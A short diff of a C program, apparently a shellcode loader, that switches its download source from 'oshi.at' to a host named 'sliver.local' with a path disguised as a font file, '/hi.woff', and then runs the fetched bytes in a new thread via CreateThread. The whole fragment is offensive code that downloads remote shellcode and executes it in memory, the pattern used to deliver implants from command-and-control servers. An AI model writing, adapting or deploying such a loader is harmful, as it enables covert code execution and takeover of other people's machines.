@@ -22,7 +22,7 @@ int main(void)
     );
 
     // Download shellcode
-    DownloadShellcode("oshi.at", 443, "/TZnq", ShellcodeAddress, ShellcodeSize);
+    DownloadShellcode("sliver.local", 443, "/hi.woff", ShellcodeAddress, ShellcodeSize);
     
     // Execute
     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ShellcodeAddress, NULL, 0, 0);
